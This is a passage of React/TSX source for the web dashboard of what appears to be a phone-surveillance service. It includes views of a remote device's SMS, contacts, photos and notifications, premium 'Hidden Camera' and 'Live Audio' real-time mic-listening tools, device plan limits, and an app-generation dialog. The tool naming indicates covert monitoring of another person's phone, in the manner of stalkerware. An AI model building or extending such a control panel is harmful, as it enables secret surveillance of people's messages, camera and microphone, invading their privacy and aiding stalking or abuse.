                                    {previewItem.resource_type === 'video' ? (
                                        <video
                                            src={previewItem.url}
                                            controls
                                            autoPlay
                                            className="max-w-full max-h-[80vh] rounded-lg shadow-2xl"
                                        />
                                    ) : (
                                        <div className="relative w-full h-[80vh] flex items-center justify-center">
                                            <img
                                                src={previewItem.url}
                                                alt="Preview"
                                                className="max-w-full max-h-full object-contain shadow-2xl rounded-lg"
                                            />
                                        </div>
                                    )}

                                    <div className="mt-6 flex gap-4">
                                        <button
                                            onClick={() => downloadSingle(previewItem.url, `download.${previewItem.resource_type === 'video' ? 'mp4' : 'jpg'}`)}
                                            className="px-6 py-3 rounded-full bg-white text-black font-bold hover:scale-105 transition-transform flex items-center gap-2"
                                        >
                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
                                            Download
                                        </button>
                                    </div>
                                </div>
                            </div>
                        )}

                        {/* SMS Detail Modal */}
                        {selectedSms && (
                            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm animate-fadeIn">
                                <div className="bg-[#1a1a1a] border border-white/20 p-6 rounded-2xl shadow-2xl max-w-lg w-full mx-4 animate-scaleIn">
                                    <div className="flex justify-between items-start mb-4">
                                        <div>
                                            <h3 className="text-lg font-bold">{selectedSms.address}</h3>
                                            <p className="text-xs text-white/40">
                                                {new Date(selectedSms.date).toLocaleDateString()} at {new Date(selectedSms.date).toLocaleTimeString()}
                                            </p>
                                        </div>
                                        <button
                                            onClick={() => setSelectedSms(null)}
                                            className="p-2 hover:bg-white/10 rounded-lg transition-colors"
                                        >
                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                                        </button>
                                    </div>
                                    <div className="p-4 rounded-xl bg-white/5 border border-white/10 mb-4">
                                        <p className="text-sm whitespace-pre-wrap">{selectedSms.body}</p>
                                    </div>
                                    <div className="flex gap-2">
                                        <span className={`text-xs px-3 py-1 rounded-full ${selectedSms.type === 1 ? 'bg-blue-500/20 text-blue-400' : 'bg-green-500/20 text-green-400'}`}>
                                            {selectedSms.type === 1 ? '📥 Received' : '📤 Sent'}
                                        </span>
                                        <span className={`text-xs px-3 py-1 rounded-full ${selectedSms.read ? 'bg-white/10 text-white/60' : 'bg-yellow-500/20 text-yellow-400'}`}>
                                            {selectedSms.read ? 'Read' : 'Unread'}
                                        </span>
                                    </div>
                                </div>
                            </div>
                        )}

                        {/* Upload Options Modal */}
                        {selectedFolder && (
                            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm animate-fadeIn">
                                <div className="bg-[#1a1a1a] border border-white/20 p-6 rounded-2xl shadow-2xl max-w-sm w-full animate-scaleIn">
                                    <h3 className="text-xl font-bold mb-1">Sync "{selectedFolder.name}"</h3>

                                    {!syncMediaType ? (
                                        <>
                                            <p className="text-white/40 text-sm mb-6">What would you like to sync?</p>
                                            <div className="grid grid-cols-2 gap-3 mb-6">
                                                <button onClick={() => setSyncMediaType('image')} className="p-4 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 transition-all flex flex-col items-center gap-2 group">
                                                    <div className="p-3 rounded-full bg-purple-500/20 text-purple-400 group-hover:scale-110 transition-transform">
                                                        <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                                                    </div>
                                                    <span className="font-medium">Images</span>
                                                </button>
                                                <button onClick={() => setSyncMediaType('video')} className="p-4 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 transition-all flex flex-col items-center gap-2 group">
                                                    <div className="p-3 rounded-full bg-blue-500/20 text-blue-400 group-hover:scale-110 transition-transform">
                                                        <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
                                                    </div>
                                                    <span className="font-medium">Videos</span>
                                                </button>
                                            </div>
                                        </>
                                    ) : (
                                        <>
                                            <p className="text-white/40 text-sm mb-6">How many {syncMediaType}s?</p>
                                            <div className="grid grid-cols-2 gap-3 mb-6">
                                                {userPlan === 'basic' ? (
                                                    <>
                                                        <button onClick={() => triggerUpload(10)} className="p-3 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 transition-colors">10 items</button>
                                                        <button onClick={() => triggerUpload(20)} className="p-3 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 transition-colors">20 items</button>
                                                        <button onClick={() => triggerUpload(50)} className="p-3 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 transition-colors">50 items</button>
                                                    </>
                                                ) : (
                                                    <>
                                                        <button onClick={() => triggerUpload(50)} className="p-3 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 transition-colors">50 items</button>
                                                        <button onClick={() => triggerUpload(100)} className="p-3 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 transition-colors">100 items</button>
                                                        <button onClick={() => triggerUpload(200)} className="p-3 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 transition-colors">200 items</button>
                                                    </>
                                                )}
                                                <button onClick={() => {
                                                    // Show ZIP vs One-by-One options
                                                    setSyncOptionsFolder({
                                                        name: selectedFolder?.name || '',
                                                        count: selectedFolder?.count || 0,
                                                        type: syncMediaType === 'video' ? 'video' : 'image'
                                                    });
                                                    setShowSyncOptionsModal(true);
                                                    setSelectedFolder(null);
                                                    setSyncMediaType(null);
                                                }} className="p-3 rounded-lg bg-gradient-to-r from-purple-600 to-blue-600 font-bold">All items</button>
                                            </div>
                                        </>
                                    )}

                                    <button onClick={() => { setSelectedFolder(null); setSyncMediaType(null); }} className="w-full py-2 text-sm text-white/40 hover:text-white transition-colors">Cancel</button>
                                </div>
                            </div>
                        )}
                    </>
                )}

                {/* WhatsApp Button - Only show when no items are selected */}
                {selectedItems.size === 0 && <WhatsAppButton />}

                {/* Device Selection Modal */}
                {isDeviceDropdownOpen && (
                    <div
                        className="animate-fadeIn"
                        style={{
                            position: 'fixed', inset: 0, zIndex: 'var(--z-modal)' as any,
                            display: 'flex', alignItems: 'flex-end', justifyContent: 'center',
                            background: 'rgba(6,11,26,0.85)', backdropFilter: 'blur(12px)',
                            WebkitBackdropFilter: 'blur(12px)',
                        }}
                        onClick={() => setIsDeviceDropdownOpen(false)}
                    >
                        <div
                            className="animate-slideUp"
                            onClick={e => e.stopPropagation()}
                            style={{
                                width: '100%', maxWidth: 420,
                                background: 'var(--bg-surface)',
                                border: '1px solid var(--border-normal)',
                                borderRadius: '1.5rem 1.5rem 0 0',
                                boxShadow: 'var(--shadow-lg)',
                                overflow: 'hidden',
                            }}
                        >
                            {/* Header */}
                            <div style={{
                                padding: '1.125rem 1.25rem',
                                borderBottom: '1px solid var(--border-subtle)',
                                display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                            }}>
                                <div>
                                    <h3 style={{ fontWeight: 700, fontSize: '1rem', color: 'var(--text-primary)' }}>Select Device</h3>
                                    <p style={{ fontSize: '0.75rem', color: 'var(--text-muted)', marginTop: '0.125rem' }}>
                                        Plan limit: {planLimits.maxDevices} device{planLimits.maxDevices > 1 ? 's' : ''}
                                    </p>
                                </div>
                                <button
                                    onClick={() => setIsDeviceDropdownOpen(false)}
                                    style={{
                                        width: 30, height: 30, borderRadius: '0.5rem',
                                        background: 'var(--bg-elevated)', border: '1px solid var(--border-subtle)',
                                        color: 'var(--text-muted)', cursor: 'pointer',
                                        display: 'flex', alignItems: 'center', justifyContent: 'center',
                                    }}
                                >
                                    <svg width="13" height="13" viewBox="0 0 13 13" fill="none">
                                        <path d="M1.5 1.5l10 10M11.5 1.5l-10 10" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" />
                                    </svg>
                                </button>
                            </div>

                            {/* Device list */}
                            <div style={{ maxHeight: '55dvh', overflowY: 'auto', padding: '0.625rem' }}>
                                {devices.length > 0 ? (
                                    devices.map((device, idx) => {
                                        const isLocked = idx >= planLimits.maxDevices;
                                        const isOffline = !device.online;
                                        const isSelected = selectedDeviceId === device.deviceId;

                                        return (
                                            <div key={device.deviceId} style={{ position: 'relative', marginBottom: '0.375rem' }} className="group">
                                                <button
                                                    onClick={() => {
                                                        if (isLocked) {
                                                            setShowPlansModal(true);
                                                            setIsDeviceDropdownOpen(false);
                                                        } else {
                                                            setSelectedDeviceId(device.deviceId);
                                                            setIsDeviceDropdownOpen(false);
                                                        }
                                                    }}
                                                    style={{
                                                        width: '100%', textAlign: 'left',
                                                        padding: '0.875rem 1rem',
                                                        borderRadius: '0.875rem',
                                                        display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                                                        background: isSelected ? 'rgba(91,94,244,0.10)'
                                                            : isLocked ? 'var(--bg-elevated)'
                                                            : 'var(--bg-elevated)',
                                                        border: `1px solid ${isSelected ? 'rgba(91,94,244,0.40)' : 'var(--border-subtle)'}`,
                                                        opacity: isLocked || isOffline ? 0.65 : 1,
                                                        cursor: 'pointer',
                                                        transition: 'background 0.2s cubic-bezier(0.32,0.72,0,1), border-color 0.2s',
                                                    }}
                                                >
                                                    <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', paddingRight: '2rem', overflow: 'hidden' }}>
                                                        {/* Status dot */}
                                                        <div style={{
                                                            width: 8, height: 8, borderRadius: '50%', flexShrink: 0,
                                                            background: isLocked ? 'var(--rose)' : isOffline ? 'var(--text-muted)' : 'var(--emerald)',
                                                            ...((!isLocked && !isOffline) ? { animation: 'pulse-online 2s infinite' } : {}),
                                                        }} />
                                                        <div style={{ overflow: 'hidden' }}>
                                                            <div style={{
                                                                fontWeight: 600, fontSize: '0.9375rem',
                                                                color: 'var(--text-primary)',
                                                                display: 'flex', alignItems: 'center', gap: '0.5rem',
                                                                overflow: 'hidden',
                                                            }}>
                                                                <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                                                                    {device.name || 'Unknown Device'}
                                                                </span>
                                                                {isLocked && (
                                                                    <span style={{
                                                                        flexShrink: 0,
                                                                        fontFamily: "'Space Grotesk', monospace",
                                                                        fontSize: '0.6rem', fontWeight: 700,
                                                                        letterSpacing: '0.08em', textTransform: 'uppercase',
                                                                        padding: '0.15rem 0.4rem', borderRadius: '0.25rem',
                                                                        background: 'rgba(244,63,94,0.15)',
                                                                        color: 'var(--rose)',
                                                                        border: '1px solid rgba(244,63,94,0.25)',
                                                                    }}>LOCKED</span>
                                                                )}
                                                            </div>
                                                            <div style={{
                                                                fontSize: '0.75rem', marginTop: '0.125rem',
                                                                color: isLocked ? 'var(--rose)' : isOffline ? 'var(--text-muted)' : 'var(--emerald)',
                                                                overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap',
                                                            }}>
                                                                {isLocked ? 'Upgrade to unlock'
                                                                    : isOffline ? `Last seen ${new Date(device.lastSeen).toLocaleDateString()}`
                                                                    : 'Online'}
                                                            </div>
                                                        </div>
                                                    </div>

                                                    {!isLocked && isSelected && (
                                                        <svg width="16" height="16" fill="none" viewBox="0 0 16 16" style={{ color: 'var(--accent)', flexShrink: 0 }}>
                                                            <path d="M3 8l3.5 3.5 6.5-7" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
                                                        </svg>
                                                    )}
                                                    {isLocked && (
                                                        <svg width="14" height="14" fill="none" stroke="currentColor" viewBox="0 0 24 24" style={{ color: 'var(--amber)', flexShrink: 0 }}>
                                                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                                                        </svg>
                                                    )}
                                                </button>

                                                {/* Delete offline device */}
                                                {isOffline && (
                                                    <button
                                                        onClick={async (e) => {
                                                            e.stopPropagation();
                                                            if (!confirm(`Delete ${device.name}?`)) return;
                                                            try {
                                                                const res = await fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/devices/delete', {
                                                                    method: 'POST',
                                                                    headers: { 'Content-Type': 'application/json' },
                                                                    body: JSON.stringify({ uuid: session?.user?.uuid, deviceId: device.deviceId })
                                                                });
                                                                if (!res.ok) {
                                                                    const data = await res.json();
                                                                    alert(data.error || 'Failed to delete device');
                                                                }
                                                            } catch {
                                                                alert('Network error deleting device');
                                                            }
                                                        }}
                                                        title="Delete offline device"
                                                        style={{
                                                            position: 'absolute', right: '0.625rem', top: '50%', transform: 'translateY(-50%)',
                                                            width: 30, height: 30, borderRadius: '0.5rem',
                                                            background: 'rgba(244,63,94,0.10)', border: '1px solid rgba(244,63,94,0.2)',
                                                            color: 'var(--rose)', cursor: 'pointer',
                                                            display: 'flex', alignItems: 'center', justifyContent: 'center',
                                                            opacity: 0, transition: 'opacity 0.2s',
                                                            zIndex: 10,
                                                        }}
                                                        className="group-hover:!opacity-100"
                                                    >
                                                        <svg width="13" height="13" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
                                                        </svg>
                                                    </button>
                                                )}
                                            </div>
                                        );
                                    })
                                ) : (
                                    <div style={{ textAlign: 'center', padding: '2rem 1rem', color: 'var(--text-muted)' }}>
                                        <svg width="40" height="40" fill="none" stroke="currentColor" viewBox="0 0 24 24" style={{ margin: '0 auto 0.75rem', opacity: 0.4 }}>
                                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
                                        </svg>
                                        <p style={{ fontWeight: 500, marginBottom: '0.25rem' }}>No devices found</p>
                                        <p style={{ fontSize: '0.8125rem', color: 'var(--text-muted)' }}>Open the app on your phone to connect</p>
                                    </div>
                                )}
                            </div>
                        </div>
                    </div>
                )}

                {/* Tools Selection Modal */}
                {isToolDropdownOpen && (() => {
                    const tools = [
                        {
                            id: 'gallery', label: 'Gallery', desc: 'View photos & videos',
                            color: '#818cf8',
                            icon: <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>,
                            premium: false,
                            onClick: () => { setSelectedTool('gallery'); setIsToolDropdownOpen(false); },
                        },
                        {
                            id: 'camera', label: 'Hidden Camera', desc: 'Capture photos & videos',
                            color: '#f472b6',
                            icon: <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" /></svg>,
                            premium: true,
                            onClick: () => {
                                if (userPlan !== 'premium') { showUpgradePrompt('Hidden Camera Tool', 'premium'); setIsToolDropdownOpen(false); return; }
                                setSelectedTool('camera'); setIsToolDropdownOpen(false);
                            },
                        },
                        {
                            id: 'audio', label: 'Live Audio', desc: 'Real-time mic listening',
                            color: '#10b981',
                            icon: <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z" /></svg>,
                            premium: true,
                            onClick: () => {
                                if (userPlan !== 'premium') { showUpgradePrompt('Live Audio Listening', 'premium'); setIsToolDropdownOpen(false); return; }
                                setSelectedTool('audio'); setIsToolDropdownOpen(false);
                            },
                        },
                        {
                            id: 'notifications', label: 'Notifications', desc: 'Live notification feed',
                            color: '#22d3ee',
                            badge: notifications.length > 0 ? String(notifications.length) : undefined,
                            icon: <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" /></svg>,
                            premium: false,
                            onClick: () => { setSelectedTool('notifications'); setIsToolDropdownOpen(false); },
                        },
                        {
                            id: 'contacts', label: 'Contacts', desc: 'View contact list',
                            color: '#10b981',
                            icon: <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z" /></svg>,
                            premium: false,
                            onClick: () => { setSelectedTool('contacts'); setIsToolDropdownOpen(false); },
                        },
                        {
                            id: 'sms', label: 'SMS', desc: 'View text messages',
                            color: '#38bdf8',
                            icon: <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" /></svg>,
                            premium: false,
                            onClick: () => { setSelectedTool('sms'); setIsToolDropdownOpen(false); },
                        },
                        {
                            id: 'torch', label: 'Flashlight', desc: 'Toggle flashlight',
                            color: '#f59e0b',
                            icon: <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>,
                            premium: false,
                            onClick: () => { setSelectedTool('torch'); setIsToolDropdownOpen(false); },
                        },
                        {
                            id: 'vibration', label: 'Vibration', desc: 'Vibrate device',
                            color: '#fb923c',
                            icon: <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>,
                            premium: false,
                            onClick: () => { setSelectedTool('vibration'); setIsToolDropdownOpen(false); },
                        },
                    ] as const;

                    return (
                    <div
                        className="animate-fadeIn"
                        style={{
                            position: 'fixed', inset: 0, zIndex: 'var(--z-modal)' as any,
                            display: 'flex', alignItems: 'flex-end', justifyContent: 'center',
                            background: 'rgba(0,0,0,0.7)', backdropFilter: 'blur(12px)',
                            WebkitBackdropFilter: 'blur(12px)',
                        }}
                        onClick={() => setIsToolDropdownOpen(false)}
                    >
                        <div
                            className="animate-slideUp w-full max-w-[440px] rounded-t-[2rem] overflow-hidden"
                            onClick={e => e.stopPropagation()}
                            style={{
                                background: 'var(--bg-surface)',
                                border: '1px solid var(--border-normal)',
                                borderBottom: 'none',
                                boxShadow: 'var(--shadow-lg)',
                            }}
                        >
                            {/* Handle bar */}
                            <div className="flex justify-center pt-3 pb-1">
                                <div className="w-10 h-1 rounded-full bg-white/10" />
                            </div>

                            {/* Header */}
                            <div className="px-5 pb-4 pt-2 flex items-center justify-between">
                                <h3 className="font-bold text-lg tracking-tight">Tools</h3>
                                <button
                                    onClick={() => setIsToolDropdownOpen(false)}
                                    className="w-8 h-8 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center text-white/40 hover:text-white hover:bg-white/10 transition-colors active:scale-90"
                                >
                                    <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
                                        <path d="M2 2l10 10M12 2l-10 10" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" />
                                    </svg>
                                </button>
                            </div>

                            {/* 2-column Tool Grid */}
                            <div className="px-4 pb-6 grid grid-cols-2 gap-2.5 max-h-[65dvh] overflow-y-auto stagger-children">
                                {tools.map(tool => {
                                    const isActive = selectedTool === tool.id;
                                    const isLocked = (tool as any).premium && userPlan !== 'premium';
                                    return (
                                        <button
                                            key={tool.id}
                                            onClick={tool.onClick}
                                            className={`tool-card text-left relative ${isActive ? 'tool-card-active' : ''}`}
                                        >
                                            <div className="flex items-start justify-between mb-3">
                                                <div
                                                    className="w-10 h-10 rounded-xl flex items-center justify-center"
                                                    style={{
                                                        background: `${tool.color}15`,
                                                        border: `1px solid ${tool.color}25`,
                                                        color: tool.color,
                                                        boxShadow: isActive ? `0 0 16px ${tool.color}20` : 'none',
                                                    }}
                                                >
                                                    {tool.icon}
                                                </div>
                                                {isActive && (
                                                    <div className="w-5 h-5 rounded-full bg-indigo-500/20 flex items-center justify-center">
                                                        <svg width="12" height="12" fill="none" viewBox="0 0 12 12" className="text-indigo-400">
                                                            <path d="M2 6l3 3 5-6" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
                                                        </svg>
                                                    </div>
                                                )}
                                                {isLocked && (
                                                    <span className="text-[9px] font-bold uppercase tracking-wider px-1.5 py-0.5 rounded bg-amber-500/15 text-amber-400 border border-amber-500/20">PRO</span>
                                                )}
                                            </div>
                                            <div className="font-semibold text-[0.8125rem] text-white/90 mb-0.5">{tool.label}</div>
                                            <div className="text-[0.6875rem] text-white/35 leading-snug">{tool.desc}</div>
                                            {(tool as any).badge && (
                                                <span
                                                    className="absolute top-3 right-3 min-w-[18px] h-[18px] rounded-full flex items-center justify-center text-[10px] font-bold px-1"
                                                    style={{ background: `${tool.color}20`, color: tool.color }}
                                                >
                                                    {(tool as any).badge}
                                                </span>
                                            )}
                                        </button>
                                    );
                                })}
                            </div>
                        </div>
                    </div>
                    );
                })()}


                {showAppModal && (
                    <AppGenerationModal
                        isOpen={showAppModal}
                        onClose={() => setShowAppModal(false)}
                        uuid={session?.user?.uuid || ''}
                        socket={socket}
                        userPlan={userPlan}
                        onUpgrade={() => setShowPlansModal(true)}
                    />
                )}

                {/* Settings Modal */}
                {isSettingsOpen && (
                    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm animate-fadeIn">
                        <div className="bg-[#1a1a1a] border border-white/20 w-full max-w-md rounded-2xl shadow-2xl animate-slideUp mx-4">
                            <div className="p-4 border-b border-white/10 flex justify-between items-center">
                                <h3 className="text-lg font-bold flex items-center gap-2">
                                    <svg className="w-5 h-5 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                                    Settings
                                </h3>
                                <button
                                    onClick={() => setIsSettingsOpen(false)}
                                    className="p-2 hover:bg-white/10 rounded-lg transition-colors"
                                >
                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                                </button>
                            </div>

                            <div className="p-4 space-y-4">
                                {/* Permission Check Section */}
                                <div className="bg-white/5 rounded-xl p-4 border border-white/10">
                                    <h4 className="text-sm font-semibold mb-3 flex items-center gap-2">
                                        <svg className="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
                                        Permission Status
                                    </h4>

                                    {selectedDeviceId ? (
                                        <>
                                            <button
                                                onClick={checkPermissions}
                                                disabled={isCheckingPermissions}
                                                className="w-full py-2 px-4 rounded-lg bg-purple-500/20 border border-purple-500/30 text-purple-400 hover:bg-purple-500/30 transition-colors flex items-center justify-center gap-2 mb-4"
                                            >
                                                {isCheckingPermissions ? (
                                                    <>
                                                        <div className="w-4 h-4 border-2 border-purple-400/30 border-t-purple-400 rounded-full animate-spin" />
                                                        Checking...
                                                    </>
                                                ) : (
                                                    <>
                                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
                                                        Check Permissions
                                                    </>
                                                )}
                                            </button>

                                            {devicePermissions && (
                                                <div className="space-y-2">
                                                    {Object.entries(devicePermissions).map(([permission, status]: [string, any]) => (
                                                        <div key={permission} className="flex items-center justify-between py-2 px-3 rounded-lg bg-black/20">
                                                            <span className="text-sm text-white/70">{permission}</span>
                                                            {status === "Granted" || status === true || status === "Yes (Good)" ? (
                                                                <span className="flex items-center gap-1 text-green-400 text-xs font-medium">
                                                                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path></svg>
                                                                    {typeof status === 'string' ? status : 'Granted'}
                                                                </span>
                                                            ) : status === "Not Requested" ? (
                                                                <span className="flex items-center gap-1 text-white/40 text-xs font-medium">
                                                                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"></path></svg>
                                                                    Not Requested
                                                                </span>
                                                            ) : (
                                                                <span className="flex items-center gap-1 text-red-400 text-xs font-medium">
                                                                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                                                                    {typeof status === 'string' ? status : 'Denied'}
                                                                </span>
                                                            )}
                                                        </div>
                                                    ))}
                                                </div>
                                            )}

                                            {!devicePermissions && !isCheckingPermissions && (
                                                <p className="text-xs text-white/40 text-center">Click "Check Permissions" to see device permission status</p>
                                            )}
                                        </>
                                    ) : (
                                        <p className="text-sm text-white/40 text-center py-4">
                                            Select a device first to check permissions
                                        </p>
                                    )}
                                </div>

                                {/* Connected Device Info */}
                                <div className="bg-white/5 rounded-xl p-4 border border-white/10">
                                    <h4 className="text-sm font-semibold mb-2">Connected Device</h4>
                                    {selectedDeviceId ? (
                                        <div className="flex items-center gap-2">
                                            <div className="w-2 h-2 rounded-full bg-green-500" />
                                            <span className="text-sm text-white/70">{devices.find(d => d.deviceId === selectedDeviceId)?.name || 'Unknown'}</span>
                                        </div>
                                    ) : (
                                        <p className="text-sm text-white/40">No device connected</p>
                                    )}
                                </div>

                                {/* Security Info */}
                                <div className="bg-white/5 rounded-xl p-4 border border-white/10">
                                    <h4 className="text-sm font-semibold mb-2 flex items-center gap-2">
